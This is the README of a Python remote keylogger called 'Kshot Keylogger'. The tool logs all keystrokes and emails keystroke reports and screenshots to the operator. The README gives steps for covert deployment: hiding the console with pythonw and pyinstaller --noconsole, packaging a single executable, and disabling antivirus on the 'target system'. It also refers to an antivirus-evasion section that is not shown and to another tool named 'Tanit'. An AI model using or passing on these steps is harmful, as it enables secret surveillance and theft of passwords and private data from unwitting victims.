# Kshot Keylogger
Kshot Keylogger is a powerfull remote python keylogger.
The tool sends you a report to your email every specific amount of time. Please change these parameters in main.py.

# Description
A python remote keylogger that logs all keystrokes and send screenshots to an email every specific amount of time.

# Requirements
```
pip install pynput
```
# Usage 
To run the tool in the foreground:

```
python main.py 
```
To run the tool in the background (on Linux or MacOS):
```
python main.py &
```

On MS Windows: you can run in background without showing a console by using pythonw.exe instead of python.exe. You can rename the extension of main.py to main.pyw if you want.
```
pythonw main.pyw
```

# Packaging
You need the pyinstaller. You can install it via pip or pip3 or via apt package manager etc
```
pip install pyinstaller
```

## Turn off any antivirus!
Please turn off any antivirus on the target system since the executable will be detected and the antivirus will try to delete or quarantine it. Antivirus evasion is addressed in the section titled 'Avoiding antiviruses'.

```
pyinstaller main.py --onefile
```
--onefile means  pyinstaller will package all the python files into a single executable

## How to package and run the excutable silently i.e. without showing a terminal or console to the user
If you do not want the user to see a command prompt after the .exe is run. You can add another argument called
--noconsole

```
pyinstaller main.py --onefile --noconsole
```
The binary will be stored in the dist folder.

## Creating a Mac OS executable
If you are on a Mac OS, the process is the same for installing 'pyinstaller'. First install pyinstaller through latest pip - with sudo privileges. NB: it is better to update to the latest pip so to avoid errors. 

```
sudo pip install pyinstaller
```

Then run pyinstaller on main.py

```
pyinstaller main.py --onefile --noconsole
```
The binary will be stored in the dist folder.

## Creating a Linux OS executable of Tanit
The process is exactly similar. The good thing in Linux is that binaries don't get executed by just making the target user double click them, they need to be run from the terminal after chmod +x makes them executable. This is why Linux rocks, the good thing here is that it is very difficult for an experienced Linux user to be fooled. In social enginering, a white hat hacker is hired by companies these days to test not only the security of networks and systems but also in similar vein to test the gullibility of the company's clerks.  

# License
This program is licensed under MIT License - you are free to distribute, change, enhance and include any of the code of this application in your tools. I only expect adequate attribution and citation of this work. The attribution should include the title of the program, the author (me!) and the site or the document where the program is taken from.

